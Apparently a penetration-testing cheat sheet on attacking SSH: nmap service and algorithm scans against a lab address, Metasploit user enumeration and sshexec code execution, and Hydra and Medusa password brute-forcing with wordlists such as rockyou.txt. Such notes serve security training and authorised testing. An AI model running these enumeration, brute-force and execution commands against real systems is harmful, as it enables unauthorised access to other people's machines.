SSH ENUM  PORT -22
----------------------------------------------------------------------------------------------------------------------------------------------------

Meaning:
• SSH stands for secure socket shell or secure shell. Commonly used port number is 22.

• It is a network protocol. That gives users a secure way to access a computer over the unsecure or open network.

• Secure shell provides strong password authentication and public key authentication as well as encrypted data communication between two computers over the internet.

• For executing commands and moving files from one computer to another , and even managing systems over the network most of the network administrators use SSH.  

```
ssh -h
unknown option -- h
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
           [-i identity_file] [-J [user@]host[:port]] [-L address]
           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
           [-w local_tun[:remote_tun]] destination [command]
```

# SSH Port Scanning
```
-v: Increase verbosity level (use -vv or more for greater effect)
-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
```

#nmap -v -p 22 192.168.56.105
PORT STATE SERVICE
22/tcp open ssh

# SSH Version Scanning
```
-v: Increase verbosity level (use -vv or more for greater effect)
 -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sV: Probe open ports to determine service/version info
 -p <port ranges>: Only scan specific ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
```

#nmap -v -sT -sV -p 22 192.168.56.105 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

By using Nmap
Many scripts are available to enumerate ssh. You can display all available scripts by using below command:
```
$cd /usr/share/nmap/scripts
$ ls | grep ssh

ssh2-enum-algos.nse
ssh-auth-methods.nse
ssh-brute.nse
ssh-hostkey.nse
ssh-publickey-acceptance.nse
ssh-run.nse
sshv1.nse
```

SSH Scanning by using predefined script 

The script for this is called ssh2-enum-algos and run against an OpenSSH server the output will look something like this

```
--script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]

#nmap -p22 -n -sV --script ssh2-enum-algos 192.168.56.105

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
```

# Exploit SSH with Metasploit

## Enumeration of users by Metasploit Framework

Metasploit Framework is preinstalled on Kali Linux. You can run framework by using below command:

msfconsole

You can search different auxiliary and exploit modules by using the “search” operator. After identifying, you can use the “use” operator to run those modules against the target
search ssh_enumusers
          This module uses a malformed packet or timing attack to enumerate users on an OpenSSH server

```
msfconsole

msf6 > use auxiliary/scanner/ssh/ssh_
use auxiliary/scanner/ssh/ssh_enum_git_keys use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_enumusers use auxiliary/scanner/ssh/ssh_login_pubkey
use auxiliary/scanner/ssh/ssh_identify_pubkeys use auxiliary/scanner/ssh/ssh_version

msf6 > use auxiliary/scanner/ssh/ssh_enumusers

msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

Name Current Setting Required Description
---- --------------- -------- -----------
CHECK_FALSE false no Check for false positives (random username)
Proxies no A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT 22 yes The target port
THREADS 1 yes The number of concurrent threads (max one per host)
THRESHOLD 10 yes Amount of seconds needed before a user is considered found (timing attack only)
USERNAME no Single username to test (username spray)
USER_FILE no File containing usernames, one per line


Auxiliary action:

Name Description
---- -----------
Malformed Packet Use a malformed packet


msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 192.168.56.105
RHOST => 192.168.56.105

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/namelist.txt
USER_FILE => /usr/share/wordlists/metasploit/namelist.txt

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 25
THREADS => 25

msf6 auxiliary(scanner/ssh/ssh_enumusers) > show
show actions show auxiliary show exploits show nops show plugins
show advanced show encoders show info show options show post
show all show evasion show missing show payloads show targets

msf6 auxiliary(scanner/ssh/ssh_enumusers) > show actions

Auxiliary actions:

Name Description
---- -----------
Malformed Packet Use a malformed packet
Timing Attack Use a timing attack

msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit
```

### SSH login using pubkey
use auxillary/scanner/ssh /ssh_login_pubkey
auxiliary (scanner/ssh /ssh_login_pubkey)>set rhosts
auxiliary (scanner/ssh /ssh_login_pubkey)>set username ignite
auxiliary (scanner/ssh /ssh_login_pubkey)>set key_path /root/.ssh/id_rsa
auxiliary (scanner/ssh /ssh_login_pubkey)>exploit

### SSH User Code Execution

msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) >set rhosts
msf exploit(sshexec) >set username ignite
msf exploit(sshexec) >set password 123
msf exploit(sshexec) >set srvhost
msf exploit(sshexec) >exploit

# Bruteforce username and password


If the ssh port is open, we can try to bruteforce username and password.

There are various tools for brute force SSH 

## Hydra 

```
`hydra -L logins.txt -P pws.txt -M targets.txt ssh
Hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-p PASS or -P FILE try password PASS, or load several passwords from FILE
-t TASKS run TASKS number of connected in parallel per target (default: 16)
-v / -V / -d verbose mode / show login+pass for each attempt / debug mode
```
#hydra -l root -P /opt/password.txt (ip) ssh -t 4

#hydra -L /opt/username.txt -P /opt/password.txt (ip) ssh -t 4

#hydra -vV -L /opt/username.txt -P /opt/password.txt (ip) ssh -t 4

## Medusa 

```
-M [TEXT] : Name of the module to execute (without the .mod extension)
-h [TEXT] : Target hostname or IP address
-U [FILE] : File containing usernames to test
-P [FILE] : File containing passwords to test
-t [NUM] : Total number of logins to be tested concurrently
```
#medusa -u root -p /opt/password.txt -h (ip) -M ssh

#medusa -u root -P /opt/password.txt -h (ip) ssh -t 4 

medusa -u rahul -P  /user/share/wordlists/rockyou.txt  -M ssh -h 192.168.1.17

medusa -U  /user/share/wordlists/rockyou.txt -p mickey  -M ssh -h 192.168.1.17



